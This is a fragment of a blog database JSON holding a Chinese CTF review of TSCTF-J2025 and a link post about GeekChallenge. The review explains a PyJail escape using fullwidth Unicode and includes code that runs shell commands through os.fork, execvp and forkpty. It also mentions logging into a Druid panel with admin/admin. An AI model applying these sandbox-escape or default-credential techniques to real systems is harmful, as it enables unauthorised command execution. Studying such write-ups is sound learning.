value=\"none\">你搞这么花干什么啊😡</label>\n</fieldset>\n\n<script>\n    var logoSetting = localStorage.getItem('extra-logo') || 'show';\n    switchLogoTo(logoSetting);\n    (document.querySelector(`input[name=logo-radio][value=${logoSetting}]`)||document.querySelector('input[name=logo-radio][value=show]')).checked = true;\n    document.getElementById(\"extra-logo\").style.display = 'flex';\n    function switchLogoTo(logo){\n        localStorage.setItem(\"extra-logo\", logo);\n        if(logo==='none'){\n            // document.getElementById(\"extra-logo\").style.display = 'none';\n            document.getElementById(\"extra-logo\").style.opacity = '0';\n        }else{\n            // document.getElementById(\"extra-logo\").style.display = 'flex';\n            document.getElementById(\"extra-logo\").style.opacity = '1';\n        }\n    }\n    document.querySelectorAll('input[name=logo-radio]').forEach((input)=>{\n        input.addEventListener(\"change\", ((input)=>(()=>{\n            switchLogoTo(input.value)\n        }))(input))\n    })\n</script>\n\n<h2 id=\"返回按钮\"><a href=\"#返回按钮\" class=\"headerlink\" title=\"返回按钮\"></a>返回按钮</h2><fieldset>\n<legend>返回按钮逻辑</legend>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"session\">在<code>sessionStorage</code>中记录返回地址</label>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"referer\">使用<code>Referer</code>作为返回地址</label>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"history\">执行<code>history.back()</code></label>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"none\">我不要这些乱七八糟的功能</label>\n<div id=\"backbtn-explain\" style=\"margin: 10px; border: 1px solid; padding: 5px\"></div>\n</fieldset>\n\n<script>\n    var backFunc = localStorage.getItem(\"backbtn-func\") || \"session\";\n    const backExplain = {\n        session: '<span>使用<code>sessionStorage</code>存储访问过的界面以模拟返回按钮</span><br/><span style=\"color: red\">缺点：会在浏览器自带的History里面拉屎，每点一次都会被当成“前进”</span>',\n        referer: '<span>使用<code>document.referer</code>作为返回目标</span><br/><span style=\"color: red\">缺点：只能返回一层，若使用了“上一篇”/“下一篇”等功能就会在两个页面来回跳</span>',\n        history: '<span>使用<code>History API</code>，与浏览器回退按钮功能一致</span><br/><span style=\"color: red\">缺点：锚点会被当成返回点，使用过目录功能后会在同一个页面上跳来跳去</span>',\n        none: '<span style=\"color: red\">解决问题的终极方法就是解决提出问题的人/事！</span>'\n    }\n    function backChoose(opt){\n        (document.querySelector(`input[name=backbtn-radio][value=${opt}]`)||document.querySelector('input[name=backbtn-radio][value=session]')).checked = true;\n        document.getElementById(\"backbtn-explain\").innerHTML = backExplain[opt] || backExplain['session'];\n    }\n    backChoose(backFunc);\n    function switchBackTo(opt){\n        localStorage.setItem(\"backbtn-func\", opt);\n        document.getElementById(\"backbtn-explain\").innerHTML = backExplain[opt] || backExplain['session'];\n    }\n    document.querySelectorAll('input[name=backbtn-radio]').forEach((input)=>{\n        input.addEventListener(\"change\", ((input)=>(()=>{\n            switchBackTo(input.value)\n        }))(input))\n    })\n</script>"}],"Post":[{"title":"GeekChallenge WP","date":"2026-01-02T19:00:56.000Z","_content":"\n上传一下GeekChallenge的WP\n\n老登太可恶了，没有拿到奖QwQ\n\n不过只有我的部分，也就是说大部分Crypto都没有欧（\n\n[BUP7-Pi-圆周率WP.pdf](BUP7-Pi-圆周率WP.pdf)","source":"_posts/GeekChallenge-WP.md","raw":"---\ntitle: GeekChallenge WP\ndate: 2026-01-03 03:00:56\ntags:\n---\n\n上传一下GeekChallenge的WP\n\n老登太可恶了，没有拿到奖QwQ\n\n不过只有我的部分，也就是说大部分Crypto都没有欧（\n\n[BUP7-Pi-圆周率WP.pdf](BUP7-Pi-圆周率WP.pdf)","slug":"GeekChallenge-WP","published":1,"updated":"2026-01-02T19:06:10.771Z","comments":1,"layout":"post","photos":[],"_id":"cmk9p9p3p0001h4vb1af38tur","content":"<p>上传一下GeekChallenge的WP</p>\n<p>老登太可恶了，没有拿到奖QwQ</p>\n<p>不过只有我的部分，也就是说大部分Crypto都没有欧（</p>\n<p><a href=\"BUP7-Pi-%E5%9C%86%E5%91%A8%E7%8E%87WP.pdf\">BUP7-Pi-圆周率WP.pdf</a></p>\n","excerpt":"","more":"<p>上传一下GeekChallenge的WP</p>\n<p>老登太可恶了，没有拿到奖QwQ</p>\n<p>不过只有我的部分，也就是说大部分Crypto都没有欧（</p>\n<p><a href=\"BUP7-Pi-%E5%9C%86%E5%91%A8%E7%8E%87WP.pdf\">BUP7-Pi-圆周率WP.pdf</a></p>\n"},{"title":"TSCTF-J2025 复盘","date":"2025-11-04T04:33:21.000Z","_content":"\n今天下午不想写作业，就来复盘一下TSCTF-J2025吧~\n\n> 不知道为什么图片路径可能会炸掉，在最后面写了一个简易的修复代码，不能保证一定有用\n> \n> 如果图炸了的话请手动拼接URL，为\n>\n> <span id=\"urlNow\"></span>image-编号.png\n\n<script>\n  document.getElementById(\"urlNow\").innerText = location.href.split('#')[0]\n  document.getElementById(\"urlNow\").innerText += location.href.split('#')[0].slice(-1)==='/'?'':'/'\n</script>\n\n## Misc\n\n### Meow\n\nWord文档的本质是一个ZIP压缩包，所以可以在里面藏东西，把扩展名改为.zip后解压，可以在`[Content_Types].xml`文件里看到一行注释\n\n![alt text](image.png)\n\n提示了base64的字母表，所以不需要一眼丁真\n\n做题时因为没有看见异常文件就忽略了这个方向\n\n### PyJail\n\n感觉自己的第一种解法应该可以做到拿os啊，为什么会触发import钩子呢？\n\n然后按照WP的方法试了一下，结果发现：是全角字符的问题\n\n![alt text](image-1.png)\n\n同样是使用`__import__`，但是使用Unicode绕过的版本会触发import，而正常半角字符的不会！\n\n经过实验，发现，是python处理unicode的时候需要先导入unicodedata这个库来支持将形近字转化，这就是最开始用Unicode绕过行不通的原因\n\n![alt text](image-2.png)\n\n再来就是后面用os的底层实现来完成指令执行了，可以用`execlp`/`execvp`来执行，不过还要处理一下`fork`和`pipe`\n\n下面是从WP里面复制的\n\n```python\nimport os\nimport sys\n\ndef run_command(cmd):\n    r, w = os.pipe()\n    pid = os.fork()\n    if pid == 0:\n        os.close(r)\n        os.dup2(w, 1)\n        os.dup2(w, 2)\n        os.close(w)\n        os.execvp(\"/bin/sh\", [\"/bin/sh\", \"-c\", cmd])\n        os._exit(1)\n    else:\n        os.close(w)\n        with os.fdopen(r) as f:\n            output = f.read()\n        os.waitpid(pid, 0)\n        return output\n\nprint(run_command(\"ls -l\"))\n\n\n\nimport os\n\ndef run_command(cmd):\n    pid, fd = os.forkpty()\n    if pid == 0:\n        os.execvp(\"sh\", [\"sh\", \"-c\", cmd])\n    else:\n        output = b''\n        while True:\n            try:\n                data = os.read(fd, 1024)\n                if not data:\n                    break\n                output += data\n            except OSError:\n                break\n        os.waitpid(pid, 0)\n        return output.decode()\n\nprint(run_command(\"ls -l\"))\n```\n\n## AI\n\n### JustReverse\n\n对着WP的代码，看了半天，简直一模一样，回去对比了一下输出，发现第一个卷积就错了，仔细一看，不禁破口大骂： __我是\\*\\*__ ，艹，一开始想试一下这个算法对不对，还没有写`line`这个变量就打算先试试，结果左下角的值算的是写死的0，后来加上了`line`变量之后忘改了，因为写的太长还没有发现！\\#\\@\\%\\!\\#\\@\\#\\@\n\n![alt text](image-4.png)\n\n把那个0改成`line[-1]`，然后就解出答案了……\n\n![alt text](image-5.png)\n\n![alt text](image-6.png)\n\n<img src=\"image-3.png\">\n<div style=\"text-align:center; font-size: 0.8em;\">《我　裂　开　来》</div>\n\n给出更正后的代码\n\n```python\nimport numpy as np\n\nn = 58\n\nimport torch\nimport torch.nn as nn\nclass Net(nn.Module):\n    def __init__(self):\n        super(Net, self).__init__()\n        self.linear = nn.Linear(n, n*n)\n        self.conv1=nn.Conv2d(1, 1, (2, 2), stride=2)\n        self.conv2=nn.Conv2d(1, 1, (1, 1), stride=1)\n        self.conv3=nn.Conv2d(1, 1, (2, 2), stride=1, padding=1)\n        self.relu=nn.ReLU()\n\n    def forward(self, x):\n        x = x.view(1, 1, 2, 2*n)\n        x = self.conv1(x)\n        x = self.relu(x)\n        x = self.conv2(x)\n        x = x.view(n)\n        x = self.linear(x)\n        x = x.view(1, 1, n, n)\n        x = self.conv3(x)\n        return x\n\nmynet=Net()\nmynet.load_state_dict(torch.load('model.pth'))\n\nout = list(map(lambda line: list(map(float, line.split(' '))), open('ciphertext.txt').readlines()))\n\nout = np.array(out)\n\nout -= mynet.conv3.bias.detach().numpy()\n\n# print(out)\n\ndef reverse_conv(kernel, after, before_size):\n    last_line = [0] + [0] * before_size + [0]\n    before = []\n    for i in range(before_size):\n        line = [0]\n        for j in range(before_size):\n            line.append((after[i][j] - kernel[0][0] * last_line[j] - kernel[0][1] * last_line[j+1] - kernel[1][0] * line[-1])/kernel[1][1])\n        last_line = line + [0]\n        before.append(line[1:])\n    return before\n\noutl = reverse_conv(mynet.conv3.weight.detach().numpy().reshape((2, 2)).tolist(), out.tolist(), n)\n\n# print(outl)\n\nlb = mynet.linear.bias.detach().numpy()\nlw = mynet.linear.weight.detach().numpy()\n\n# print(lb.shape)\n# print(lw.shape)\n\nout2 = np.linalg.inv(lw.T @ lw) @ (lw.T @ (np.array(outl).reshape((-1)) - lb))\n\n# print(out2)\n\nout1 = (out2 - mynet.conv2.bias.detach().numpy()) / mynet.conv2.weight.detach().numpy()\n\n# print(out1)\n\nw1 = mynet.conv1.weight.detach().numpy()\nb1 = mynet.conv1.bias.detach().numpy()\n\nori = (out1 - b1).reshape((-1))\n\n# print(ori)\najust = [round(i) for i in ori.tolist()]\n# print(ajust)\nb = sum([[i&1, (i&2)//2] for i in ajust], []) + sum([[(i&4)//4, (i&8)//8] for i in ajust], [])\n# print(b)\nfor i in range(0, len(b), 8):\n    print(chr(int(''.join(map(str, b[i:i+8])), base=2)), end='', flush=True)\n```\n\n注：不过还是学到了东西的，WP里面用的是`pinv`方法直接求广义逆，但我们高代还没有学到广义逆，我也不知道有这么一个函数，就手动搓了一个 $(W^TW)^{-1}(W^TY)$\n$$\n(W^TW)^{-1}(W^TY)\\\\\\\\\n=(W^TW)^{-1}(W^T(WX))\\\\\\\\\n=(W^TW)^{-1}(W^TW)X\\\\\\\\\n=X\n$$\n\n## Web\n\n### Druid\n\n看到WP之后我是不能理解当时在干什么的……\n\nadmin/admin登录之后在数据源里面就有用户名\n\n![alt text](image-7.png)\n\n## Reverse\n\n### Catbits\n\n那么这道题剩下的那个Toko在哪里呢？答案是：`舞台`也是可以存放代码的！\n\n这是在面试的时候学长讲的，WP里面也有，所以只要在角色的右边选舞台就可以看到了\n\n![alt text](image-8.png)\n\n<hr>\n\n差不多就写到这吧，马上要上英语课了\n\n后面有机会的话可能还会写写Reverse里面solves>=2的题，以及Pwn的一些题目\n\n<script>\n  // 修复图炸的情况\n    (new Array(...document.getElementsByTagName('img'))).forEach(\n        img=>{\n            if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n                console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n                img.src=img.src.split('/').slice(-1)\n            }\n    })\n</script>","source":"_posts/TSCTF-J2025-复盘.md","raw":"---\ntitle: TSCTF-J2025 复盘\ndate: 2025-11-04 12:33:21\ntags:\n---\n\n今天下午不想写作业，就来复盘一下TSCTF-J2025吧~\n\n> 不知道为什么图片路径可能会炸掉，在最后面写了一个简易的修复代码，不能保证一定有用\n> \n> 如果图炸了的话请手动拼接URL，为\n>\n> <span id=\"urlNow\"></span>image-编号.png\n\n<script>\n  document.getElementById(\"urlNow\").innerText = location.href.split('#')[0]\n  document.getElementById(\"urlNow\").innerText += location.href.split('#')[0].slice(-1)==='/'?'':'/'\n</script>\n\n## Misc\n\n### Meow\n\nWord文档的本质是一个ZIP压缩包，所以可以在里面藏东西，把扩展名改为.zip后解压，可以在`[Content_Types].xml`文件里看到一行注释\n\n![alt text](image.png)\n\n提示了base64的字母表，所以不需要一眼丁真\n\n做题时因为没有看见异常文件就忽略了这个方向\n\n### PyJail\n\n感觉自己的第一种解法应该可以做到拿os啊，为什么会触发import钩子呢？\n\n然后按照WP的方法试了一下，结果发现：是全角字符的问题\n\n![alt text](image-1.png)\n\n同样是使用`__import__`，但是使用Unicode绕过的版本会触发import，而正常半角字符的不会！\n\n经过实验，发现，是python处理unicode的时候需要先导入unicodedata这个库来支持将形近字转化，这就是最开始用Unicode绕过行不通的原因\n\n![alt text](image-2.png)\n\n再来就是后面用os的底层实现来完成指令执行了，可以用`execlp`/`execvp`来执行，不过还要处理一下`fork`和`pipe`\n\n下面是从WP里面复制的\n\n```python\nimport os\nimport sys\n\ndef run_command(cmd):\n    r, w = os.pipe()\n    pid = os.fork()\n    if pid == 0:\n        os.close(r)\n        os.dup2(w, 1)\n        os.dup2(w, 2)\n        os.close(w)\n        os.execvp(\"/bin/sh\", [\"/bin/sh\", \"-c\", cmd])\n        os._exit(1)\n    else:\n        os.close(w)\n        with os.fdopen(r) as f:\n            output = f.read()\n        os.waitpid(pid, 0)\n        return output\n\nprint(run_command(\"ls -l\"))\n\n\n\nimport os\n\ndef run_command(cmd):\n    pid, fd = os.forkpty()\n    if pid == 0:\n        os.execvp(\"sh\", [\"sh\", \"-c\", cmd])\n    else:\n        output = b''\n        while True:\n            try:\n                data = os.read(fd, 1024)\n                if not data:\n                    break\n                output += data\n            except OSError:\n                break\n        os.waitpid(pid, 0)\n        return output.decode()\n\nprint(run_command(\"ls -l\"))\n```\n\n## AI\n\n### JustReverse\n\n对着WP的代码，看了半天，简直一模一样，回去对比了一下输出，发现第一个卷积就错了，仔细一看，不禁破口大骂： __我是\\*\\*__ ，艹，一开始想试一下这个算法对不对，还没有写`line`这个变量就打算先试试，结果左下角的值算的是写死的0，后来加上了`line`变量之后忘改了，因为写的太长还没有发现！\\#\\@\\%\\!\\#\\@\\#\\@\n\n![alt text](image-4.png)\n\n把那个0改成`line[-1]`，然后就解出答案了……\n\n![alt text](image-5.png)\n\n![alt text](image-6.png)\n\n<img src=\"image-3.png\">\n<div style=\"text-align:center; font-size: 0.8em;\">《我　裂　开　来》</div>\n\n给出更正后的代码\n\n```python\nimport numpy as np\n\nn = 58\n\nimport torch\nimport torch.nn as nn\nclass Net(nn.Module):\n    def __init__(self):\n        super(Net, self).__init__()\n        self.linear = nn.Linear(n, n*n)\n        self.conv1=nn.Conv2d(1, 1, (2, 2), stride=2)\n        self.conv2=nn.Conv2d(1, 1, (1, 1), stride=1)\n        self.conv3=nn.Conv2d(1, 1, (2, 2), stride=1, padding=1)\n        self.relu=nn.ReLU()\n\n    def forward(self, x):\n        x = x.view(1, 1, 2, 2*n)\n        x = self.conv1(x)\n        x = self.relu(x)\n        x = self.conv2(x)\n        x = x.view(n)\n        x = self.linear(x)\n        x = x.view(1, 1, n, n)\n        x = self.conv3(x)\n        return x\n\nmynet=Net()\nmynet.load_state_dict(torch.load('model.pth'))\n\nout = list(map(lambda line: list(map(float, line.split(' '))), open('ciphertext.txt').readlines()))\n\nout = np.array(out)\n\nout -= mynet.conv3.bias.detach().numpy()\n\n# print(out)\n\ndef reverse_conv(kernel, after, before_size):\n    last_line = [0] + [0] * before_size + [0]\n    before = []\n    for i in range(before_size):\n        line = [0]\n        for j in range(before_size):\n            line.append((after[i][j] - kernel[0][0] * last_line[j] - kernel[0][1] * last_line[j+1] - kernel[1][0] * line[-1])/kernel[1][1])\n        last_line = line + [0]\n        before.append(line[1:])\n    return before\n\noutl = reverse_conv(mynet.conv3.weight.detach().numpy().reshape((2, 2)).tolist(), out.tolist(), n)\n\n# print(outl)\n\nlb = mynet.linear.bias.detach().numpy()\nlw = mynet.linear.weight.detach().numpy()\n\n# print(lb.shape)\n# print(lw.shape)\n\nout2 = np.linalg.inv(lw.T @ lw) @ (lw.T @ (np.array(outl).reshape((-1)) - lb))\n\n# print(out2)\n\nout1 = (out2 - mynet.conv2.bias.detach().numpy()) / mynet.conv2.weight.detach().numpy()\n\n# print(out1)\n\nw1 = mynet.conv1.weight.detach().numpy()\nb1 = mynet.conv1.bias.detach().numpy()\n\nori = (out1 - b1).reshape((-1))\n\n# print(ori)\najust = [round(i) for i in ori.tolist()]\n# print(ajust)\nb = sum([[i&1, (i&2)//2] for i in ajust], []) + sum([[(i&4)//4, (i&8)//8] for i in ajust], [])\n# print(b)\nfor i in range(0, len(b), 8):\n    print(chr(int(''.join(map(str, b[i:i+8])), base=2)), end='', flush=True)\n```\n\n注：不过还是学到了东西的，WP里面用的是`pinv`方法直接求广义逆，但我们高代还没有学到广义逆，我也不知道有这么一个函数，就手动搓了一个 $(W^TW)^{-1}(W^TY)$\n$$\n(W^TW)^{-1}(W^TY)\\\\\\\\\n=(W^TW)^{-1}(W^T(WX))\\\\\\\\\n=(W^TW)^{-1}(W^TW)X\\\\\\\\\n=X\n$$\n\n## Web\n\n### Druid\n\n看到WP之后我是不能理解当时在干什么的……\n\nadmin/admin登录之后在数据源里面就有用户名\n\n![alt text](image-7.png)\n\n## Reverse\n\n### Catbits\n\n那么这道题剩下的那个Toko在哪里呢？答案是：`舞台`也是可以存放代码的！\n\n这是在面试的时候学长讲的，WP里面也有，所以只要在角色的右边选舞台就可以看到了\n\n![alt text](image-8.png)\n\n<hr>\n\n差不多就写到这吧，马上要上英语课了\n\n后面有机会的话可能还会写写Reverse里面solves>=2的题，以及Pwn的一些题目\n\n<script>\n  // 修复图炸的情况\n    (new Array(...document.getElementsByTagName('img'))).forEach(\n        img=>{\n            if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n                console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n                img.src=img.src.split('/').slice(-1)\n            }\n    })\n</script>","slug":"TSCTF-J2025-复盘","published":1,"updated":"2026-01-02T18:36:41.346Z","comments":1,"layout":"post","photos":[],"_id":"cmk9p9p3r0003h4vb7pltc7ug","content":"<p>今天下午不想写作业，就来复盘一下TSCTF-J2025吧~</p>\n<blockquote>\n<p>不知道为什么图片路径可能会炸掉，在最后面写了一个简易的修复代码，不能保证一定有用</p>\n<p>如果图炸了的话请手动拼接URL，为</p>\n<p><span id=\"urlNow\"></span>image-编号.png</p>\n</blockquote>\n<script>\n  document.getElementById(\"urlNow\").innerText = location.href.split('#')[0]\n  document.getElementById(\"urlNow\").innerText += location.href.split('#')[0].slice(-1)==='/'?'':'/'\n</script>\n\n<h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"Meow\"><a href=\"#Meow\" class=\"headerlink\" title=\"Meow\"></a>Meow</h3><p>Word文档的本质是一个ZIP压缩包，所以可以在里面藏东西，把扩展名改为.zip后解压，可以在<code>[Content_Types].xml</code>文件里看到一行注释</p>\n<p><img src=\"/image.png\" alt=\"alt text\"></p>\n<p>提示了base64的字母表，所以不需要一眼丁真</p>\n<p>做题时因为没有看见异常文件就忽略了这个方向</p>\n<h3 id=\"PyJail\"><a href=\"#PyJail\" class=\"headerlink\" title=\"PyJail\"></a>PyJail</h3><p>感觉自己的第一种解法应该可以做到拿os啊，为什么会触发import钩子呢？</p>\n<p>然后按照WP的方法试了一下，结果发现：是全角字符的问题</p>\n<p><img src=\"/image-1.png\" alt=\"alt text\"></p>\n<p>同样是使用<code>__import__</code>，但是使用Unicode绕过的版本会触发import，而正常半角字符的不会！</p>\n<p>经过实验，发现，是python处理unicode的时候需要先导入unicodedata这个库来支持将形近字转化，这就是最开始用Unicode绕过行不通的原因</p>\n<p><img src=\"/image-2.png\" alt=\"alt text\"></p>\n<p>再来就是后面用os的底层实现来完成指令执行了，可以用<code>execlp</code>&#x2F;<code>execvp</code>来执行，不过还要处理一下<code>fork</code>和<code>pipe</code></p>\n<p>下面是从WP里面复制的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">run_command</span>(<span class=\"params\">cmd</span>):</span><br><span class=\"line\">    r, w = os.pipe()</span><br><span class=\"line\">    pid = os.fork()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> pid == <span class=\"number\">0</span>:</span><br><span class=\"line\">        os.close(r)</span><br><span class=\"line\">        os.dup2(w, <span class=\"number\">1</span>)</span><br><span class=\"line\">        os.dup2(w, <span class=\"number\">2</span>)</span><br><span class=\"line\">        os.close(w)</span><br><span class=\"line\">        os.execvp(<span class=\"string\">&quot;/bin/sh&quot;</span>, [<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, cmd])</span><br><span class=\"line\">        os._exit(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        os.close(w)</span><br><span class=\"line\">        <span class=\"keyword\">with</span> os.fdopen(r) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">            output = f.read()</span><br><span class=\"line\">        os.waitpid(pid, <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> output</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(run_command(<span class=\"string\">&quot;ls -l&quot;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">run_command</span>(<span class=\"params\">cmd</span>):</span><br><span class=\"line\">    pid, fd = os.forkpty()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> pid == <span class=\"number\">0</span>:</span><br><span class=\"line\">        os.execvp(<span class=\"string\">&quot;sh&quot;</span>, [<span class=\"string\">&quot;sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, cmd])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        output = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                data = os.read(fd, <span class=\"number\">1024</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> data:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                output += data</span><br><span class=\"line\">            <span class=\"keyword\">except</span> OSError:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        os.waitpid(pid, <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> output.decode()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(run_command(<span class=\"string\">&quot;ls -l&quot;</span>))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"AI\"><a href=\"#AI\" class=\"headerlink\" title=\"AI\"></a>AI</h2><h3 id=\"JustReverse\"><a href=\"#JustReverse\" class=\"headerlink\" title=\"JustReverse\"></a>JustReverse</h3><p>对着WP的代码，看了半天，简直一模一样，回去对比了一下输出，发现第一个卷积就错了，仔细一看，不禁破口大骂： <strong>我是**</strong> ，艹，一开始想试一下这个算法对不对，还没有写<code>line</code>这个变量就打算先试试，结果左下角的值算的是写死的0，后来加上了<code>line</code>变量之后忘改了，因为写的太长还没有发现！#@%!#@#@</p>\n<p><img src=\"/image-4.png\" alt=\"alt text\"></p>\n<p>把那个0改成<code>line[-1]</code>，然后就解出答案了……</p>\n<p><img src=\"/image-5.png\" alt=\"alt text\"></p>\n<p><img src=\"/image-6.png\" alt=\"alt text\"></p>\n<img src=\"image-3.png\">\n<div style=\"text-align:center; font-size: 0.8em;\">《我　裂　开　来》</div>\n\n<p>给出更正后的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">58</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Net</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(Net, <span class=\"variable language_\">self</span>).__init__()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.linear = nn.Linear(n, n*n)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.conv1=nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"number\">2</span>, <span class=\"number\">2</span>), stride=<span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.conv2=nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"number\">1</span>, <span class=\"number\">1</span>), stride=<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.conv3=nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"number\">2</span>, <span class=\"number\">2</span>), stride=<span class=\"number\">1</span>, padding=<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.relu=nn.ReLU()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        x = x.view(<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>*n)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.conv1(x)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.relu(x)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.conv2(x)</span><br><span class=\"line\">        x = x.view(n)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.linear(x)</span><br><span class=\"line\">        x = x.view(<span class=\"number\">1</span>, <span class=\"number\">1</span>, n, n)</span><br><span class=\"line\"> 